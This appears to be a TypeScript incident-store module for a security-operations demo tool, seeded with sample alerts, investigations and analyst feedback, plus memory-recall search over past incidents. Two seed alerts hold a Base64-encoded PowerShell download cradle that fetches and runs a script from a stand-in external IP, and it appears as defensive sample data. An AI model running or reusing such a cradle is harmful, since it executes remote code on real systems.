import fs from 'fs';
import path from 'path';
import { IncidentRecord, RecalledMemory, SecurityAlertPayload } from '../src/types/sentinel.js';
import { calculateMemoryRelevance } from '../src/utils/memoryMatcher.js';

const DATA_DIR = path.resolve(process.cwd(), 'data');
const STORE_FILE = path.join(DATA_DIR, 'sentinelops-store.json');

const INITIAL_INCIDENTS: IncidentRecord[] = [
  {
    id: 'INC-2026-0891',
    alert: {
      alertId: 'SEC-4401',
      title: 'Suspicious PowerShell execution on FIN-SRV-04',
      severity: 'critical',
      timestamp: '2026-11-06T19:14:22.000Z',
      sourceIp: '10.0.12.44',
      destinationIp: '198.51.100.24',
      affectedAsset: 'FIN-SRV-04',
      userAccount: 'CORP\\svc-payroll',
      processName: 'powershell.exe',
      commandLine: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk4LjUxLjEwMC4yNDo4MDgwL3NjcmlwdHMvc2NyLnBzMScp',
      parentProcess: 'wmic.exe',
      fileHash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      detectionSource: 'CrowdStrike Falcon Sensor / Sysmon Event ID 1',
      rawLogs: '{"event_id": 1, "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "parent_image": "C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe", "user": "CORP\\\\svc-payroll", "integrity_level": "High"}',
      tags: ['T1059.001', 'T1047', 'Finance-Subnet', 'C2-Beacon']
    },
    status: 'confirmed_malicious',
    createdAt: '2026-11-06T19:15:00.000Z',
    updatedAt: '2026-11-06T19:42:00.000Z',
    investigation: {
      incidentId: 'SEC-4401',
      analyzedAt: '2026-11-06T19:16:30.000Z',
      threatVerdict: 'Confirmed Malicious PowerShell C2 Ingestion via WMIC',
      severity: 'critical',
      confidence: 98,
      summary: 'Adversary leveraged compromised service account svc-payroll to remotely invoke encoded PowerShell via WMI on FIN-SRV-04, attempting to retrieve scr.ps1 from an external staging host.',
      suspiciousActivityExplanation: [
        'WMIC.exe invoked on FIN-SRV-04 under high-integrity service credentials without scheduled task justification.',
        'Obfuscated Base64 PowerShell flags (-NoProfile -WindowStyle Hidden) utilized to bypass basic command logging.',
        'Direct HTTP request initiated to untrusted external IP (198.51.100.24:8080) targeting secondary payload scr.ps1.'
      ],
      mitreTechniques: [
        { id: 'T1059.001', tactic: 'Execution', name: 'Command and Scripting Interpreter: PowerShell' },
        { id: 'T1047', tactic: 'Execution', name: 'Windows Management Instrumentation (WMI)' },
        { id: 'T1027', tactic: 'Defense Evasion', name: 'Obfuscated Files or Information' },
        { id: 'T1071.001', tactic: 'Command and Control', name: 'Application Layer Protocol: Web Protocols' }
      ],
      evidence: [
        'Process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        'Parent Process: C:\\Windows\\System32\\wbem\\WMIC.exe',
        'Command Line contains encoded download cradle: http://198.51.100.24:8080/scripts/scr.ps1',
        'Authenticated Account: CORP\\svc-payroll'
      ],
      assumptions: [
        'External IP 198.51.100.24 is an active attacker-controlled C2 redirector.',
        'Initial access gained via phishing or password spraying targeting accounting tier.'
      ],
      recommendedSteps: [
        { priority: 'immediate', action: 'Isolate FIN-SRV-04 from the corporate network.', rationale: 'Halt potential lateral movement into financial ledger databases.' },
        { priority: 'immediate', action: 'Revoke and rotate Kerberos TGT and NTLM hashes for CORP\\svc-payroll.', rationale: 'Invalidate hijacked authentication tokens across Active Directory.' },
        { priority: 'high', action: 'Blacklist external IP 198.51.100.24 on perimeter firewalls.', rationale: 'Sever outbound C2 communication channel.' },
        { priority: 'high', action: 'Perform memory acquisition on FIN-SRV-04 before reboot.', rationale: 'Capture volatile payload and injected DLL artifacts.' }
      ],
      memoryInformed: false,
      recalledMemoriesCount: 0,
      memoryInfluenceSummary: 'Baseline investigation created prior to memory retention.'
    },
    feedback: {
      verdict: 'confirmed_malicious',
      analystName: 'Alex Mercer (Lead Threat Hunter)',
      notes: 'Incident validated. Forensic analysis verified memory injection attempt targeting LSASS process. Forensic triage recovered secondary script scr.ps1 containing Cobalt Strike stager.',
      rootCause: 'Compromised service account svc-payroll utilized WMIC process creation to execute obfuscated PowerShell staging script for credential dumping.',
      remediationTaken: '1. Isolated FIN-SRV-04 via EDR. 2. Reset svc-payroll password and revoked all active Kerberos TGT tickets. 3. Blocked external C2 IP 198.51.100.24 on perimeter firewalls. 4. Updated EDR blocklist for payload hash e3b0c442...',
      retainedInHindsight: true,
      hindsightResponse: {
        success: true,
        bankId: 'sentinelops-soc-prod',
        operationId: 'hs-op-89104-fin-04',
        message: 'Successfully retained incident outcome in Hindsight Cloud memory bank'
      },
      submittedAt: '2026-11-06T19:42:00.000Z'
    }
  },
  {
    id: 'INC-2026-0895',
    alert: {
      alertId: 'SEC-4402',
      title: 'Suspicious PowerShell execution on FIN-SRV-07',
      severity: 'critical',
      timestamp: '2026-11-06T22:15:10.000Z',
      sourceIp: '10.0.12.78',
      destinationIp: '198.51.100.24',
      affectedAsset: 'FIN-SRV-07',
      userAccount: 'CORP\\svc-payroll',
      processName: 'powershell.exe',
      commandLine: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk4LjUxLjEwMC4yNDo4MDgwL3NjcmlwdHMvc2NyLnBzMScp',
      parentProcess: 'wmic.exe',
      fileHash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      detectionSource: 'CrowdStrike Falcon Sensor / Sysmon Event ID 1',
      rawLogs: '{"event_id": 1, "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "parent_image": "C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe", "user": "CORP\\\\svc-payroll", "integrity_level": "High"}',
      tags: ['T1059.001', 'T1047', 'Finance-Subnet', 'Unresolved-Alert']
    },
    status: 'new',
    createdAt: '2026-11-06T22:15:30.000Z',
    updatedAt: '2026-11-06T22:15:30.000Z'
  },
  {
    id: 'INC-2026-0872',
    alert: {
      alertId: 'SEC-4389',
      title: 'Canary Ransomware Decoy File Modified on FILE-SRV-02',
      severity: 'critical',
      timestamp: '2026-11-06T14:20:00.000Z',
      sourceIp: '10.0.4.12',
      affectedAsset: 'FILE-SRV-02',
      userAccount: 'SYSTEM',
      processName: 'veeam_backup.exe',
      commandLine: 'veeam_backup.exe --job-id=daily-corp-sync --mode=dedup',
      detectionSource: 'Sentinel Canary Guard',
      rawLogs: '{"canary_file": "D:\\\\Shares\\\\Finance\\\\!Readme_Encrypted.txt", "trigger": "file_entropy_check"}',
      tags: ['Ransomware-Canary', 'FileServer']
    },
    status: 'false_positive',
    createdAt: '2026-11-06T14:21:00.000Z',
    updatedAt: '2026-11-06T15:02:00.000Z',
    investigation: {
      incidentId: 'SEC-4389',
      analyzedAt: '2026-11-06T14:25:00.000Z',
      threatVerdict: 'Automated Canary Triggered by Enterprise Backup Job',
      severity: 'medium',
      confidence: 94,
      summary: 'High entropy modification detected on canary decoy directory caused by scheduled Veeam deduplication engine during maintenance window.',
      suspiciousActivityExplanation: [
        'File modification signature coincided with scheduled storage deduplication window at 14:20.',
        'Executing process verified as legitimately signed Veeam binary.'
      ],
      mitreTechniques: [
        { id: 'T1486', tactic: 'Impact', name: 'Data Encrypted for Impact' }
      ],
      evidence: [
        'Process binary: C:\\Program Files\\Veeam\\Backup\\veeam_backup.exe (Valid Microsoft Authenticode signature)',
        'Trigger file was read, compressed and rewritten during backup'
      ],
      assumptions: [
        'Canary folder was not excluded from Veeam job scope.'
      ],
      recommendedSteps: [
        { priority: 'medium', action: 'Whitelist canary honeypot directories from backup agent scanning.', rationale: 'Prevent false alarms during scheduled storage maintenance.' }
      ],
      memoryInformed: false,
      recalledMemoriesCount: 0
    },
    feedback: {
      verdict: 'false_positive',
      analystName: 'Elena Rostova',
      notes: 'Confirmed false positive. Storage maintenance job compressed canary decoy file. No ransomware behavior present.',
      rootCause: 'Veeam deduplication and compression engine scanned honeypot folder.',
      remediationTaken: 'Updated backup policy exclusion rules to skip Sentinel Canary directories.',
      retainedInHindsight: true,
      hindsightResponse: {
        success: true,
        bankId: 'sentinelops-soc-prod',
        operationId: 'hs-op-87201-file-02',
        message: 'Retained false positive pattern in Hindsight memory'
      },
      submittedAt: '2026-11-06T15:02:00.000Z'
    }
  },
  {
    id: 'INC-2026-0880',
    alert: {
      alertId: 'SEC-4395',
      title: 'Suspicious Anomaly: DNS Tunneling Query Volume Spike',
      severity: 'medium',
      timestamp: '2026-11-06T17:45:00.000Z',
      sourceIp: '10.0.18.99',
      destinationIp: '8.8.8.8',
      affectedAsset: 'DEV-WRK-19',
      userAccount: 'CORP\\m.chen',
      processName: 'chrome.exe',
      detectionSource: 'CoreDNS Zeek Sensor',
      rawLogs: '{"query_count": 4820, "subdomain_entropy": 4.82, "root_domain": "telemetry-metrics.io"}',
      tags: ['T1071.004', 'DNS-Exfiltration', 'Workstation']
    },
    status: 'investigating',
    createdAt: '2026-11-06T17:46:00.000Z',
    updatedAt: '2026-11-06T17:46:00.000Z'
  }
];

class IncidentStore {
  private incidents: IncidentRecord[] = [];
  private recallQueriesCount = 0;

  constructor() {
    this.loadFromDisk();
  }

  private loadFromDisk() {
    try {
      if (fs.existsSync(STORE_FILE)) {
        const raw = fs.readFileSync(STORE_FILE, 'utf-8');
        const parsed = JSON.parse(raw);
        if (Array.isArray(parsed) && parsed.length > 0) {
          this.incidents = parsed;
          return;
        }
      }
    } catch (err) {
      console.warn('Could not read existing incidents from disk, initializing defaults:', err);
    }

    // Seed defaults
    this.incidents = JSON.parse(JSON.stringify(INITIAL_INCIDENTS));
    this.saveToDisk();
  }

  private saveToDisk() {
    try {
      if (!fs.existsSync(DATA_DIR)) {
        fs.mkdirSync(DATA_DIR, { recursive: true });
      }
      fs.writeFileSync(STORE_FILE, JSON.stringify(this.incidents, null, 2), 'utf-8');
    } catch (err) {
      console.error('Failed to save incidents to disk:', err);
    }
  }

  public getAll(): IncidentRecord[] {
    return this.incidents;
  }

  public getById(id: string): IncidentRecord | undefined {
    return this.incidents.find(i => i.id === id || i.alert.alertId === id);
  }

  public create(alert: SecurityAlertPayload): IncidentRecord {
    const record: IncidentRecord = {
      id: `INC-2026-${Math.floor(1000 + Math.random() * 9000)}`,
      alert,
      status: 'new',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };
    this.incidents.unshift(record);
    this.saveToDisk();
    return record;
  }

  public update(id: string, updates: Partial<IncidentRecord>): IncidentRecord | undefined {
    const index = this.incidents.findIndex(i => i.id === id || i.alert.alertId === id);
    if (index === -1) return undefined;

    this.incidents[index] = {
      ...this.incidents[index],
      ...updates,
      updatedAt: new Date().toISOString()
    };
    this.saveToDisk();
    return this.incidents[index];
  }

  public incrementRecallCount() {
    this.recallQueriesCount++;
  }

  public getRecallCount(): number {
    return this.recallQueriesCount;
  }

  /**
   * Retrieves all historical memories retained across resolved incidents.
   */
  public getLocalMemories(): RecalledMemory[] {
    const memories: RecalledMemory[] = [];
    for (const inc of this.incidents) {
      if (inc.feedback && inc.feedback.retainedInHindsight) {
        memories.push({
          id: `mem-${inc.id}`,
          title: inc.alert.title,
          summary: `${inc.alert.title} on asset ${inc.alert.affectedAsset}. Process: ${inc.alert.processName || 'N/A'}. Root cause: ${inc.feedback.rootCause}`,
          asset: inc.alert.affectedAsset,
          resolution: inc.feedback.remediationTaken,
          verdict: inc.feedback.verdict,
          relevanceScore: 0.95,
          source: 'local_store',
          timestamp: inc.feedback.submittedAt,
          keyFacts: [
            `Asset: ${inc.alert.affectedAsset}`,
            `Process: ${inc.alert.processName || 'N/A'} (Parent: ${inc.alert.parentProcess || 'N/A'})`,
            `Command: ${inc.alert.commandLine ? inc.alert.commandLine.slice(0, 70) + '...' : 'N/A'}`,
            `Analyst Notes: ${inc.feedback.notes.slice(0, 100)}`
          ]
        });
      }
    }
    return memories;
  }

  /**
   * Searches local memory store matching an incoming alert.
   */
  public searchLocalMemories(alert: SecurityAlertPayload, currentIncidentId?: string): RecalledMemory[] {
    const memories = this.getLocalMemories();
    const matches: RecalledMemory[] = [];

    for (const mem of memories) {
      // Don't recall self
      if (currentIncidentId && mem.id === `mem-${currentIncidentId}`) {
        continue;
      }

      const score = calculateMemoryRelevance(alert, `${mem.title} ${mem.summary} ${mem.resolution}`, mem.asset);
      if (score >= 0.5) {
        matches.push({
          ...mem,
          relevanceScore: score
        });
      }
    }

    return matches.sort((a, b) => b.relevanceScore - a.relevanceScore);
  }

  public resetToDemo() {
    this.incidents = JSON.parse(JSON.stringify(INITIAL_INCIDENTS));
    this.saveToDisk();
    return this.incidents;
  }
}

export const incidentStore = new IncidentStore();
